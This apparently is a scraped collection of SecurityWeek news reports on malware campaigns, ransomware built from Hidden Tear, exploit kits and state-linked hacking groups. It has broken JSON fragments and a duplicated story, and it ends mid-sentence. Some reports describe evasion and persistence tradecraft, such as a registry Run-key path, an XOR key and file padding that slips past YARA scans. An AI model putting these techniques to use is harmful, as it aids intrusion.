According to Cisco, a high amount of traffic associated with the RIG Exploit Kit has been seen using malvertising to perform drive-by download attacks on the visitors of popular, legitimate websites. Cisco said that on April 24 it began to identify malicious traffic related to the attacks, whic so far has been coming from over 90 domains. According to Cisco, that attacks have been found using landing pages that host exploits for Java, Flash and Silverlight. Cisco researchers highlight the fact that attackers are increasingly using Microsoft Silverlight exploits in their operations, with such exploits being included in packs like Fiesta and Angler as well.  If the exploit is successful, the payload, namely the Cryptowall ransomware, is downloaded onto victims’ computers. Once it infects a system, Cryptowall, which is similar to the notorious CryptoLocker, encrypts local files and instructs users to pay a ransom in order to recover them.  Based on the requests for RIG landing pages, experts have been able to identify the websites hosting the malicious ads. The list of affected sites includes ebay.in, altervista.org, apps.facebook.com, wiki.answers.com, theguardian.com and go.com.  Most of the impacted users are located in the United States (42%) and the United Kingdom (31%).  Until May 22, cybercriminals used both compromised legitimate websites and newly-registered domains to host the landing pages. Many of the hijacked domains are running WordPress, and they’ve been most likely compromised through brute-force attacks, rather than vulnerabilities in the platform, Cisco noted.  “Using existing legitimate sites to host the EK alleviates the need to create and maintain a dedicated domain infrastructure, and mitigates some of the problems associated with doing so: registering new domains, randomizing naming, using multiple email addresses, etc., in order to avoid easy attribution,” Cisco’s Andrew Tsonchev explained in a blog post.  After May 22, only newly-registered domain names have been utilized. Starting with this date, the attackers also stopped using only paths ending in “proxy.php,” most likely in an effort to avoid detection, experts said. In May, Kahu Security reported that the RIG Exploit Kit was being rented for $60 per day or $300 per week. " }

Turkey-based security researcher Utku Sen released in August 2015 the source code of Hidden Tear, a piece of file-encrypting ransomware designed for educational purposes. Since he suspected that his creation might be abused by cybercriminals, Sen intentionally weakened the encryption in Hidden Tear so that victims could recover their files without paying the ransom demanded by malicious actors. One of the threats based on Hidden Tear is Linux.Encoder, the first ransomware designed to target Linux systems. Researchers at Bitdefender cracked Linux.Encoder’s encryption for each of the three versions released by cybercriminals. Last week, security firm Trend Micro reported finding another piece of ransomware based on Hidden Tear. The threat, detected as Ransom_Cryptear.B, demanded 2,000 Brazilian reals ($500) from victims using a ransom note written in Portuguese. The problem with Cryptear.B is that in addition to the victim’s files, it also encrypts a text file containing the decryption key. Since this key is not sent to the attacker, it’s very difficult to recover encrypted files even if the ransom is paid, Trend Micro noted. After obtaining a Cryptear.B sample, Sen determined that the ransomware is based on Hidden Tear Offline Edition, a version designed to work on computers that don’t have an Internet connection. Since Hidden Tear Offline is designed to work with a removable USB drive, the encryption key is supposed to be copied to the USB drive, which is why Cryptear.B doesn’t send the key to the attacker before encrypting it. However, Sen says Hidden Tear Offline also has a backdoor that can be used to recover encrypted files. The encryption seed can be obtained from the timestamp of an encrypted file, which makes it relatively easy to recover the key needed for decryption. “All my malware codes are backdoored on purpose,” Sen told SecurityWeek last week after learning of Trend Micro’s report on Cryptear.B. “The purpose is to reduce the risk which is caused by script kiddies. I can defeat most of the samples if the antivirus companies ask for my help.” While Sen said he released Hidden Tear for educational purposes, some experts believe it wasn’t a wise decision. One of them is security researcher Yonathan Klijnsma, who provided Sen a Cryptear.B sample for analysis. “There is no educational purpose for releasing source code for a piece of ransomware,” Klijnsma told SecurityWeek. “Cryptographic implementations to secure files, sure, ransomware no. We have too much to deal with already, you really don't want to help anyone in that business.” Klijnsma also pointed out that since the Turkish hacker disclosed how he weakened the crypto implementation in Hidden Tear, he made it possible for malicious actors to make the changes necessary to create a more efficient ransomware.

Security blogger Brian Krebs learned from his sources in the financial industry that a fraud pattern had been spotted on cards used at locations of the Nashville, Tennessee-based restaurant chain. Shortly after Krebs published a blog post on Friday, Best American Hospitality Corp. confirmed that some of the Shoney's corporate affiliated restaurants it manages and operates had been hit by a data breach. The company hired Kroll Cyber Security to investigate the incident. The security firm determined that hackers had remotely installed malware on payment processing systems at tens of Shoney’s restaurants. The malware was designed to steal data such as cardholder name, card number, expiration date and internal verification code as it was being routed through the infected device. Investigators determined that in some cases the malware may not have obtained cardholder names. Kroll’s investigation showed that some of the impacted locations were breached on December 27, 2016, while others were first compromised on January 11. Best American Hospitality is confident that the breach was contained by March 6. As of last year, there were roughly 150 company-owned and franchised Shoney's restaurants across 17 U.S. states. Best American Hospitality said the breach affected 37 locations in South Carolina, Tennessee, Louisiana, Alabama, Georgia, Mississippi, Virginia, Missouri, Florida and Arkansas. Several other major restaurant chains reported suffering data breaches in the past months, including CiCi’s, Arby’s, Wendy’s and Noodles & Company. IHG warns of card-stealing malware at front desks In addition to restaurants, several major hotel chains also reported being hit by card-stealing malware. One of them is InterContinental Hotels Group (IHG), which in early February confirmed that systems processing payments for bars and restaurants at 12 of the properties it manages had been compromised. Now, IHG has informed customers that it has identified malware which may have stolen data from cards used at hotel front desks. The malware is believed to have stolen data between September 29 and December 29, 2016, but the company only received confirmation that the threat had been neutralized in February and March, when the affected properties were investigated.

ActiveX controls are usually disabled on most systems, but the South Korean government demands they are enabled on machines in the country. This has led to numerous attacks abusing ActiveX to compromise systems in South Korea, with many of the attacks attributed to North Korean hackers. The same applies to the newly observed attacks, where JavaScript code was used to deploy various ActiveX vulnerabilities, including a zero-day. Soon after the attacks occurred, local media attributed them to the Andariel gang, which is said to be part of Lazarus, the state-sponsored hacking group considered the most serious threat against banks. Also referred to as BlueNoroff, the group has orchestrated high profile attacks such as the devastating attack against Sony Pictures in late 2014 and the $81 million cyber heist from Bangladesh's account at the New York Federal Reserve Bank in 2016. This year, the actor supposedly switched targets to cryptocurrency, but also hit an online casino in Central America. According to a new AlienVault report, the Lazarus hackers were behind the recently revealed ActiveX attacks as well. The group used a profiling script as the initial reconnaissance tool, in an attempt to gather information on possible targets. Although this is a tactic the Lazarus group has employed before, other threat actors use it as well. The next step of the attack involved scripts capable of gathering additional information from the system and designed to deliver the ActiveX exploit. In a tweet several weeks ago, Cyber Warfare Intelligence Center and IssueMakersLab founder Simon Choi shared some details on the scripts used in the assault, revealing that an initial reconnaissance stage was deployed in January 2017, while script injections only occurred in late April 2018. The script was designed to identify the browser and operating system running on the victim’s machine and borrows much of the code from PinLady’s Plugin-Detect. When detecting Internet Explorer on a machine, the script checks if ActiveX is enabled, as well as plugins running (from a specific list of ActiveX components). AlienVault also notes that one of the other scripts involved in the attack, apparently used for profiling, sends data to a website that might have been compromised a while back, as it was previously recorded as a command and control (C&C) server for Lazarus malware in 2015. The ActiveX exploit used in the recent assault, also shared by Simon Choi on Twitter, was meant to download malware from peaceind[.]co.kr and save it to the system as splwow32.exe. “Splwow32.exe is a fairly uncommon filename for malware, and was previously seen in the Taiwan bank heist which has been attributed to another sub-set of the Lazarus attackers. We also note that the peaceind[.]co.kr site has been previously identified as vulnerable,” AlienVault says. The malware appears to be called Akdoor, a simple backdoor designed to execute commands using Command Prompt. The malware also uses a “distinctive command and control protocol,” the security researchers say. " }

Last month, IE saw a lot of activity, first with the out-of-band patch released on May 1, a point fix released as part of May’s Patch Tuesday, and a vulnerability that was publicly disclosed by the Zero-Day Initiative on May 21. We will have to wait and see if June Patch Tuesday is a cumulative update for the popular browser but odds are it will be. And if you’re still using XP, you’re out of luck.\" The second critical bulletin impacts Windows, Office and Microsoft Lync. According to Microsoft, it can be exploited to remotely execute code. Two other bulletins involving Windows and Lync Server are rated Important and can result in information disclosure. The other three bulletins rated Important deal with remote code execution, tampering and denial-of-service issues. \"Patch Tuesday, June 2014 advance notification once again falls under the shadow of looming OpenSSL issues,\" said Ross Barrett, senior manager of security engineering at Rapid7, in reference to patches released today to address OpenSSL vulnerabilities. \"These ones don’t have quite the catchy name as the last round, but they should not be ignored. That said, this is about the Microsoft advisories coming next week. There are seven of them, two critical, five important – one of which is the seldom seen 'tampering' type.\" The updates will be released June 10.  " }

Njw0rm is a variant of njRAT, a tool believed to be developed by a Kuwait-based individual. In June 2014, Microsoft announced the results of an operation targeting njRAT (Bladabindi) and Njw0rm (Jenxcus). At the time, the company noted that cybercriminals could create their own versions of the malware because the necessary information and packages were available on public forums. Trend Micro says the source code of Njw0rm was published on hacker forums in May 2013, after which cybercriminals started creating new pieces of malware based on the threat. One of the new RATs is Kjw0rm. Version 2.0 of the malware was first spotted by the security firm in January 2014. Kjw0rm 0.5X and a new worm dubbed Sir DoOom emerged in December 2014.  The new pieces of malware come with an enhanced control panel and they include several new features not seen in Njw0rm. In addition to information on the victim’s IP address, location, operating system, and USB devices, Kjw0rm’s control panel includes data on installed antiviruses (v2.0) and the presence of the .NET framework (v0.5x). Sir Do0om, on the other hand, also provides the botmaster with information on RAM, firewalls, antiviruses, CPU/GPU, and product details (name, ID, key). As far as functions are concerned, Njw0rm can execute commands and files, steal credentials, and receive updates from the attacker. The Kjw0rm RATs allow their master to shut down or restart the computer, open Web pages, and download and execute files and code. Sir Do0om is even more interesting since it can be used to mine Bitcoin, launch DDoS attacks, control computers based on a timer, display messages, terminate antivirus processes, and open a website related to Quran, the central religious text of Islam. This RAT is also designed to terminate itself if the presence of a virtual machine is detected. Just like Njw0rm, the new threats are designed to propagate via removable devices. They hide some or all the folders found on the infected device and create shortcut links pointing to the malware with the names of the hidden folders. “This evolution shows that the malware authors are becoming more active in developing new malware and using njw0rm as a template. Because of this pattern, we can expect to see more variants of this malware in the future,” Trend Micro threat response engineer Michael Marcos said in a blog post. " }

The said Flash Player flaw, a remote code execution vulnerability identified as CVE-2017-11292, was patched by Adobe on Monday. Kaspersky Lab, whose researchers spotted the attacks and reported the security hole to Adobe, has published a blog post detailing the attacks. According to the security firm, a Middle Eastern group it tracks as BlackOasis has been using CVE-2017-11292 in highly targeted attacks to deliver FinFisher, a controversial lawful interception tool also known as FinSpy and WingBird. Kaspersky believes that the country sponsoring BlackOasis is likely a customer of Gamma Group, the company behind FinFisher. Last month, Microsoft patched a .NET zero-day that had been exploited by the same threat group via malicious Office documents to deliver FinFisher malware. That attack was first spotted by experts at FireEye, but Kaspersky made the connection to the latest attacks based on the command and control (C&C) server used by the hackers. This is the fifth zero-day vulnerability attributed by Kaspersky Lab to the BlackOasis group since June 2015. According to Kaspersky, attacks leveraging CVE-2017-11292 start with a malicious Office document delivered via email. The document includes an ActiveX object that contains the Flash exploit. “The exploit is a memory corruption vulnerability that exists in the “com.adobe. tvsdk.mediacore. BufferControlParameters” class. If the exploit is successful, it will gain arbitrary read / write operations within memory, thus allowing it to execute a second stage shellcode,” Kaspersky researchers explained. The second stage shellcode downloads and executes the latest version of the FinFisher spyware, and fetches a decoy document that is displayed to avoid raising suspicion. The latest version of the malware includes several new features designed to make it more difficult for researchers to analyze the threat. Kaspersky reported seeing BlackOasis victims in Russia, Iraq, Afghanistan, Nigeria, Libya, Jordan, Tunisia, Saudi Arabia, Iran, the Netherlands, Bahrain, the United Kingdom and Angola. “BlackOasis’ interests span a wide gamut of figures involved in Middle Eastern politics and verticals disproportionately relevant to the region. This includes prominent figures in the United Nations, opposition bloggers and activists, and regional news correspondents,” Kaspersky said. “During 2016, we observed a heavy interest in Angola, exemplified by lure documents indicating targets with suspected ties to oil, money laundering, and other illicit activities. There is also an interest in international activists and think tanks.” Microsoft, which tracks the BlackOasis group as NEODYMIUM, reported last year that the threat actor had been using a Flash Player exploit (CVE-2016-4117) to deliver FinFisher malware. More than 80 percent of the victims were identified at the time in Turkey. " }

One of the threats developed using the source code has a flawed encryption mechanism that might make it impossible for victims to recover their files, but the author of the educational ransomware believes he can crack it since his code includes backdoors. In August 2015, Turkey-based hacker Utku Sen released the source code for Hidden Tear, a tool described as a “ransomware-like file crypter sample which can be modified for specific purposes.” The Hidden Tear source code was accompanied by a legal warning that said the tool should only be used for educational purposes. As expected, cybercriminals ignored the warning and used the Hidden Tear source code to create their own file-encrypting ransomware. One of these threats is Ransom_Cryptear.B, a piece of malware detected by Trend Micro on a Paraguayan website apparently compromised by a Brazilian black hat hacker. The compromised website was set up to serve Cryptear disguised as an Adobe Flash Player installer. Once it infects the system, the ransomware changes the desktop background to a ransom note written in Portuguese demanding 2,000 Brazilian reals ($500) from victims. Cryptear generates a decryption key and saves it in a text file before encrypting the files on the victim’s system. However, since text files are on the list of file types targeted by the ransomware, the decryption key is also encrypted, making it very difficult for users to recover their files even if they pay the ransom, Trend Micro said in a blog post. Cryptear doesn’t appear to be the only piece of ransomware leveraging the Hidden Tear source code. The Linux ransomware Linux.Encoder, whose encryption mechanism was easily cracked by researchers, is also based on it. Utku Sen revealed in November that he released the source code for beginners and students who want to understand how ransomware works, but he also designed it as a “honeypot for script kiddies.” The expert said he intentionally weakened Hidden Tear’s encryption so that files can be recovered without paying the ransom, which has happened in the case of Linux.Encoder. Malware developers released three versions of Linux.Encoder and none of them have a strong file encryption mechanism. Utku Sen told SecurityWeek that he just learned about Ransom_Cryptear.B, but the expert believes he might be able to decrypt the files if Trend Micro shares the sample with him. “All my malware codes are backdoored on purpose,” he said via email. “The purpose is to reduce the risk which is caused by script kiddies. I can defeat most of the samples if the antivirus companies ask for my help. Otherwise I need to find the ransomware sample on my own, which takes time. Sometimes I can't because the crooks sell the ransomware for money.” Still, security experts believe that releasing the Hidden Tear source code wasn’t a good decision. “The security industry should be very careful when releasing information that could be used by threat actors. Even if the intentions of security researchers or security vendors are to educate the public, they need to carefully assess the risks prior to the release of possibly harmful information,” Trend Micro said. Security researcher Yonathan Klijnsma protested the open sourcing of the project from day one and he even filed an abuse report with GitHub to have it removed. “There is no educational purpose for releasing source code for a piece of ransomware,” Klijnsma told SecurityWeek. “Cryptographic implementations to secure files, sure, ransomware no. We have too much to deal with already, you really don't want to help anyone in that business.” Furthermore, the researcher believes that by disclosing how he weakened the crypto implementation, the author of Hidden Tear made it possible for malicious actors to make some changes and create a “proper” ransomware.

{ "_id" : { "$oid" : "5b27c3b76cefc41c844ab1ea" }, "Category" : "Malware", "Title" : "Researchers Detail Regin Attack Platform Modules", "Address" : "https://www.securityweek.com/researchers-detail-regin-attack-platform-modules", "Date" : "January 22, 2015", "Article" : "Researchers at Kaspersky Lab released details today of two modules used by the notorious Regin malware platform first exposed last year. Publicly identified separately in November by security researchers at Kaspersky Lab and Symantec, Regin has been linked to cyber-espionage campaigns going back to at least 2008. In addition to stealing information from targets such as banks and government agencies, the malware was also used to target telecom operators and to penetrate and monitor GSM (Global System for Mobile Communications) networks. According to Kaspersky Lab, two modules named 'hopscotch' and 'legspin' were designed as standalone tools that seem to predate the Regin platform by several years. \"Despite the overall sophistication (and sometimes even over-engineering) of the Regin platform, these tools are simple, straightforward and provide interactive console interfaces for Regin operators,\" Kaspersky Lab researchers Costin Raiu and Igor Soumenkov explained in a joint blog post. \"What makes them interesting is the fact they were developed many years ago and could even have been created before the Regin platform itself.\" For example, the Legspin module is believed to go back to 2003 and possibly 2002. The module was developed as a standalone command line utility for complete administration, the researchers wrote. When run remotely, it operates a backdoor and includes full console support. It also features colored output when run locally, and can distinguish between consoles that support Windows Console API and TTY-compatible terminals that accept escape codes for coloring. \"Once started and initialized, it provides the operator with an interactive command prompt, waiting for incoming commands,\" the researchers explained. \"The list of available commands is pretty large and allows the operators to perform many administrative actions. Some of the commands require additional information that is requested from the operator, and the commands provide a text description of the available parameters. The program is actually an administrative shell that is intended to be operated manually by the attacker/user.\" According to Kaspersky Lab, the Legspin module doesn't have a built-in command and control mechanism, and instead uses the Regin platform to redirect the console input/output to/from the operators. Meanwhile, the Hopscotch module was designed as an interactive tool for lateral movement. It does not contain any exploits; instead it relies on previously stolen credentials to authenticate itself at the remote machine using standard APIs, the researchers wrote. \"The module establishes a two-way encrypted communication channel with the remote payload SVCSTAT.EXE using two named pipes,\" they continued. \"One pipe is used to forward input from the operator to the payload and the other writes data from the payload to the standard output. Data is encrypted using the RC4 algorithm and the initial key exchange is protected using asymmetric encryption. Once completed, the tool deletes the remote file and closes the authenticated sessions, effectively removing all the traces of the operation.\" \"Although more details about Regin are becoming available, there is still a lot that remains unknown,\" the researchers wrote. \"One thing is already clear – what we know about Regin is probably already retired information that has been replaced by new modules and techniques as time passes.\" " }
{ "_id" : { "$oid" : "5b27c3b76cefc41c844ab1eb" }, "Category" : "Malware", "Title" : "Targeted Malware Inflated With Junk Data to Avoid Detection", "Address" : "https://www.securityweek.com/targeted-malware-inflated-junk-data-avoid-detection", "Date" : "April 13, 2017", "Article" : "A piece of malware used in targeted attacks aimed at South Korea and Japan is inflated with junk data in an effort to avoid detection. While the technique is not exactly new, researchers at Kaspersky Lab believe this particular malware is noteworthy. The security firm came across the malware while analyzing attacks involving a malware toolkit dubbed “XXMM.” The threat, disguised as a file named srvhost.exe in an effort to avoid raising suspicion, had a size of more than 100 Mb. Kaspersky’s investigation has revealed that the malware is a Trojan loader designed to activate a backdoor called “wali” by its author. The backdoor module is injected into the iexplore.exe process by the loader. The size of malware samples typically ranges between a few kilobytes and a few megabytes, depending on how they are packaged. Cybercriminals have also been known to hide malware in movie or ISO files, which can result in malware that has a size of hundreds of megabytes or even a few gigabytes. What makes Wali interesting is the fact that it’s not delivered as a 100 Mb file. The initial loader is roughly 1 Mb in size, but its two dropper components append tens of megabytes of garbage data to the final malware executable file. Since the junk data is created dynamically by the droppers, the size of the malware file can vary. Kaspersky has seen both 50 Mb and 100 Mb samples in real world attacks, but experts have also observed a 200 Mb sample generated using the same technique. Researchers believe this is also a noteworthy threat due to the fact that it has been used in targeted attacks. “While this technique may seem inefficient in its primitive approach to bypass detection, we believe that in certain cases this malware may stay below the radar of incident responders and forensic analysts who use YARA rules to scan hard drives,” explained Kaspersky’s Suguru Ishimaru. “The reason is that one of the common practices for YARA rule authors is to limit the size of scanned files, which is aimed mainly at improving performance of the scanning process. Large files, like the ones produced by XXMM malware, may become invisible for such rules, which is why we would like to recommend security researchers to consider this when creating rules for dropped malwares,” the expert added.

{ "_id" : { "$oid" : "5b27c3b86cefc41c844ab1ec" }, "Category" : "Malware", "Title" : "Multi-Stage Attacks Target Service Centers in Russia", "Address" : "https://www.securityweek.com/multi-stage-attacks-target-service-centers-russia", "Date" : "June 11, 2018", "Article" : "Fortinet security researchers recently observed a series of cyber-attacks targeting Russian service centers offering maintenance and support for various electronic goods. The attacks stand out because of their multi-staging and are believed to have been launched by a non-Russian actor. The attackers used spear-phishing emails and malicious Office documents exploiting CVE-2017-11882, a 17 years old vulnerability in Office’s Equation Editor that Microsoft manually patched in October last year. The targeted attack started at the end of March with spear-phishing emails received at a service company that repairs Samsung’s electronic devices. Pretending to come from representatives of Samsung, the emails specifically targeted this organization, were written in Russian, and contained a file named Symptom_and_repair_code_list.xlsx, related to the targeted company’s profile. The emails were likely the result of machine translation, instead of being created by a native Russian speaker, the security researchers reveal. Furthermore, the headers of the email revealed that the IP address of the sender wasn’t related to the domain in the “From” field. The attackers used different attachments for each email, but all messages had seemingly legitimate .XLSX files attached. Furthermore, all of the documents contained an exploit for the CVE-2017-11882 vulnerability. The shellcode used in the attacks was meant to perform various tasks to gain access to the LoadLibraryA and GetProcAddress functions that allow it to execute the final payload. It also imports other functions, including one used to determine the exact location where the downloaded payload should be stored. The payload features multiple-layer multi-packer protection, starting with an initial layer where the well-known ConfuserEx packer was used to obfuscate objects names, along with the names of methods and resources. From these resources, it reads the next stage payload, which is encrypted using DES, and executes the decrypted file. The decrypted file, named BootstrapCS, is the second stage of the multi-layer protection. While not obfuscated, it contains multiple anti-analysis checks, with the structure “settings” in the resources section determining which checks should be performed. This stage can check for various emulation, sandbox, and virtual machine tools, and also searches for and shuts down specified processes, in addition to disabling system utilities. It also writes the payload path to startup registry keys, hides the file with system and hidden attributes, and injects the payload in various processes. A binary resource named mainfile is the encrypted stage 3 of the payload. It is an executable that represents the third level of packing protection: a simple XOR algorithm with the KEY = 0x20 was used for encryption. The decrypted payload is injected into a process based on the value in the settings resource file. The stage 3 of the payload references to a commercial Remote Administration Tool (RAT) called Imminent Monitor, which can be purchased by anyone, directly from the app developer (who apparently prohibits the malicious use of the program). At stage 4, the security researchers once again stumbled upon ConfuserEx. The main payload of the attack, however, turned out to be the commercial version of the Imminent Monitor RAT, which includes five modules to record videos using the victim’s webcam, to spy on victims, and to control their machines. The command and control (C&C) servers used in these attacks led the researchers to discover 50 domains registered on the same day, some of which were used to spread malware, while others for phishing attacks. The researchers also discovered older .XLSX samples that use the same C&C but attempt to exploit different vulnerabilities. “We also noticed that the pattern of these attacks has become quite popular today. The use of exploits is more efficient than the use of simple executable files, especially since the level of threat-awareness among users has sufficiently grown in recent years. It is simply not that easy to trick a user to opening executable file as it was before. Exploits are a different case,” Fortinet concludes. " }

Dubbed Simplocker, the malware scans the SD card for certain file types, encrypts them and then demands a ransom in exchange for decrypting the files. After launching the malware will display a message in Russian warning that the victim's phone has been locked while files are being encrypted in a separate thread in the background. The message demands payment in Ukrainian money, indicating that region of the world is likely the primary target. \"The sample we’ve analyzed is in the form of an application called ‘Sex xionix’,\" blogged Robert Lipovsky, malware researcher at ESET. \"It was not found on the official Google Play and we estimate that its prevalence is very low at this time. Our analysis of the Android/Simplock.A sample revealed that we are most likely dealing with a proof-of-concept or a work in progress – for example, the implementation of the encryption doesn’t come close to “the infamous Cryptolocker” on Windows.\" This is not the first example of cyber-extortionists going mobile. Earlier this year, the 'Koler' malware, which is believed to be the brainchild of the malware authors of the Reveton ransomware, was also observed targeting Android users. In that case however, the malware did not actually encrypt files. Instead, it only locked the user's screen and claimed to encrypt the files as part of a scheme to force users to pay the $300 ransom. In the case of Simplocker, the malware orders the victim pay the equivalent of $21 US using the MoneXy service. The malware will scan the SD card for files with any of the following image, document or video extensions: jpeg, jpg, png, bmp, gif, pdf, doc, docx, txt, avi, mkv, 3gp or mp4. It will then encrypt those files using AES, according to Lipovsky. The malware will also contact its command and control server and send identifiable information from the device such as the IMEI (International Mobile Station Equipment Identity) number. The command and control server is hosted on a TOR .onion domain.  \"While the malware does contain functionality to decrypt the files, we strongly recommend against paying up – not only because that will only motivate other malware authors to continue these kinds of filthy operations, but also because there is no guarantee that the crook will keep their part of the deal and actually decrypt them,\" he blogged. In an email with SecurityWeek, Lipovsky noted that ransomware is not yet a huge problem on mobile devices. However, it is increasing, he stated.  \"The first thing you can do is start regularly backing up your data,\" advised Lipovsky. \"Ransomware is not a big deal if you can simply replace the encrypted files. The second is to install only frequently-reviewed apps from well-known, reputable app stores. And the third is to install an anti-malware scanner for your mobile device.\"  " }

Evidence found by researchers suggests that the actor is based in China. The first report on Tick was published in April 2016 by Symantec. However, the security firm pointed out at the time that the threat group had likely been active for at least a decade prior to its activities being discovered. Tick has been known to use a downloader tracked as Gofarer and a data-stealing Trojan dubbed Daserf. A report published by Palo Alto Networks earlier this year linked the custom-built Daserf malware – based on command and control (C&C) servers – to a threat known as Minzen, XXMM, Wali and ShadowWali. The first Tick attacks detailed by Symantec focused on technology, aquatic engineering, and broadcasting firms in Japan. Palo Alto Networks reported seeing campaigns aimed at defense and high-tech organizations in Japan and South Korea. A new report published last week by SecureWorks links Tick to China based on several pieces of evidence. For example, the group uses T-SMB Scan tools created by a Chinese developer, an early version of the Minzen backdoor used Chinese characters in a service name, and there are links between Daserf and the NCPH group, which has been tied to the Chinese military. Experts also pointed out that Tick activity has typically decreased during Chinese national holidays, and targeting intellectual property and economic intelligence from competing countries is something China has been known to do. The attacks observed by the security firm were aimed at Japanese organizations in the critical infrastructure, manufacturing, heavy industry and international relations sectors. The hackers have mainly targeted intellectual property related to technology and development, business and sales information, emails and meeting schedules, product specifications, and network and system configuration files. The report from SecureWorks also provides some information on Datper, a piece of malware used in 2016 and 2017, which experts believe was meant to replace Daserf. XXMM has been used by the threat actor in roughly the same period. The Tick group has continued to use spear-phishing and watering hole attacks to breach the systems of its targets. However, SecureWorks has also seen attacks involving a zero-day vulnerability affecting a popular Japanese corporate tool. The zero-day has been used to breach the systems of numerous Japanese organizations, but the hackers only proceeded with further activities in the case of companies that presented an interest. In some cases, the attackers managed to remain undetected within compromised networks for as much as five years. Once it no longer needs any information from a target, Tick attempts to remove all evidence of its activities on the compromised networks. " }

The threat, which payload hashes provided by Zscaler show was discovered in late December, has been dubbed “Spymel” and it’s designed to allow cybercriminals to steal information from compromised machines and spy on the victim. Attackers have distributed the malware via spam emails containing an archived JavaScript file that downloads Spymel from a remote server and installs it on infected systems. While the downloader source code is not protected in any way, the actual malware executable, a .NET binary, is highly obfuscated. The file is signed with a digital certificate issued by DigiCert to SBO INVEST, which, according to Reason Core Security, is a France-based software publisher. It appears the malware developers have somehow obtained more than one certificate issued to this company. The first version of the malware analyzed by Zscaler had been signed with a certificate that has been revoked by DigiCert, but a newer variant, which experts spotted two weeks later, was signed with a different certificate issued to SBO INVEST. Spymel, a threat designed to work on both Windows XP and Windows 7 systems, creates registry keys for persistence. The malware’s configuration data, including for command and control (C&C), is hardcoded within the malware executable. The Trojan uses modules to perform various tasks. One of the modules allows cybercriminals to log keystrokes and save the data to a file. Another module, dubbed “ProtectMe,” is designed to prevent the victim from terminating the malware using tools like Process Explorer, Task Manager, Process Hacker, or the taskkill command. “The malware monitors application like Task Manager, Process Explorer, and Process Hacker. It uses GetForegroundWindow() API to get the handle of active window and changes it's functionality if process is from the above list,” Zscaler researchers explained. Attackers can use the C&C server to send various commands to the malware, including for collecting information about the infected system and the files found on it, deleting, executing or renaming a specified file, uploading a specified file to the C&C, capturing a screenshot of the desktop, and enabling or disabling video recording. The C&C server used by the malware is hosted on the android.sh domain, which has a Germany IP address. It’s not uncommon for potentially unwanted applications (PUA) and malware to abuse digital certificates. The number of certificates used to sign malware has increased steadily over the past years, with more than 6,000 cases being recorded in 2014.

The first spam campaign for distributing the new version of the malware, detected as Trojan.Carberp.C, was spotted by Symantec researchers on December 15, just one day after the Trojan was apparently compiled. Carberp.C, like its predecessors, is primarily designed to harvest information, but it can also carry out other tasks with the aid of plugins that are injected into a newly created process (svchost.exe). One of the plugins analyzed by researchers hooks APIs in an effort to steal usernames, passwords and other sensitive data from Web browsers. The malware is capable of infecting both 32-bit and 64-bit systems and its authors have developed plugins for various CPU architectures, researchers said. The spam emails discovered by Symantec are designed to look like invoice payment reminders. The Trojan dropper, which is packed with Visual Basic, is attached to these messages as a .ZIP archive file. Once it’s executed, the dropper injects code into a Windows process, and decrypts and decompresses embedded components. One of these components is MyFault, a legitimate Windows driver used to trigger system crashes for troubleshooting purposes. Experts believe the malware developers are using it to crash the infected device in case the threat is being analyzed. Another component is the downloader, which silently downloads the payload. The Carberp driver is the component utilized to kill processes and inject malicious payloads into memory in order to keep the infection hidden. Australia appears to be the main target, but some infections have also been spotted in the United States and elsewhere. It appears cybercriminals are increasingly focusing on Australia. Recent reports show that file-encrypting ransomware has been highly successful in this region over the past period. The full source code of Carberp was made available on underground forums in June 2013, shortly after Russian authorities announced arresting an individual believed to be the mastermind behind the financial malware. Trojan.Carberp.B was discovered in November 2014, but in the meantime, malware authors also used the source code to create Zberp, a hybrid combining elements from Zeus and Carberp. " }

Windows Vista has been receiving software updates for the past 10 years, but Microsoft has decided that the time has come to move on. “As of April 11, 2017, Windows Vista customers are no longer receiving new security updates, non-security hotfixes, free or paid assisted support options, or online technical content updates from Microsoft,” the company notes on its support website. Data coming from netmarketshare shows that the move would impact only 0.72% of all desktop users out there, but that is still a significant figure, considering that many of the Windows Vista computers are used within business environments. A November report from Duo Security revealed that 65% of the security company’s clients' Windows users were using Vista. The threat this poses to enterprise networks is amplified by the continuous use of an even older operating system within business environments: Windows XP. The platform currently has 7.44% of the desktop operating system market, yet it hasn’t received updates since 2014. Now that support has ended, Windows Vista will continue to work as before, only that it will become increasingly vulnerable to security risks and malware. What’s more, Internet Explorer 9, which runs on Vista, isn’t supported either, meaning that users are exposed to additional threats when browsing the web using this application. “Also, as more software and hardware manufacturers continue to optimize for more recent versions of Windows, you can expect to encounter more apps and devices that do not work with Windows Vista,” Microsoft says. In fact, major browser makers have already announced their end of support for the platform. Mozilla revealed in December 2016 that it would no longer support Vista and XP starting this year, while Google’s Chrome 49 was the last browser iteration released for the two platforms. Gmail isn’t offering support for the operating systems either, after it dropped support for Chrome 53 and older versions in February. To further determine users to move away from Windows Vista, Microsoft also stopped providing Microsoft Security Essentials for download on this platform. Antimalware signature updates will continue to arrive for installed instances for a limited time, after which users will remain exposed to newer threats. “Please note that Microsoft Security Essentials (or any other antivirus software) will have limited effectiveness on PCs that do not have the latest security updates. This means that PCs running Windows Vista will not be secure and will still be at risk for virus and malware,” Microsoft notes. " }

The malware, which has been named Soraya, uses a mix of memory scraping techniques similar to the Dexter malware while intercepting form data sent from web browsers like the Zeus Trojan. According to Arbor Networks, thousands of payment cards have been compromised by the malware. The firm was able to access track data from one command and control after the attacker temporarily placed the card data in a publicly accessible location. Arbor Network's analysis of the track one data revealed that 65.16 percent of the compromised payment cards were issued by financial institutions located in the U.S. Financial institutions in Costa Rica were also heavily affected, and were tied to 21.45 percent of the cards. Debit cards were the most prevalent, accounting for nearly 64 percent of the stolen cards. The rest were credit cards, Arbor Networks found. Matt Bing, research analyst at Arbor Networks, said that the malware was identified by the firm in May. Several other security vendors have added detection for it as well. However, several of those vendors label it with generic terms such as 'Trojan' or 'Dropper', he said. \"Our analysis should help vendors fine-tune their detections and provide context around a specific threat, i.e. a piece of malware that steals credit cards versus something perhaps more benign,\" he told SecurityWeek. Soraya begins by injecting itself as a thread on a variety of system processes such as Windows Shell explorer.exe. To maintain its persistence, the malware writes a copy of itself into the AppData directory with the name servhost.exe and sets itself to execute with the registry: keyHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WinServHost. \"New processes launched from the infected explorer.exe shell, notably web browsers, will have Soraya code injected,\" blogged Bing and fellow Arbor Networks researcher Dave Loftus. \"The malware does this by hooking calls to the ntdll.dll!NtResumeThread() function, which is responsible for process initialization. The function ntdll!NtQueryDirectoryFile() is also hooked to hide displaying the servhost.exe file. Both of these techniques are similar to functionality found in the Zeus family of malware.\" \"One thread on the system is responsible for scraping memory for 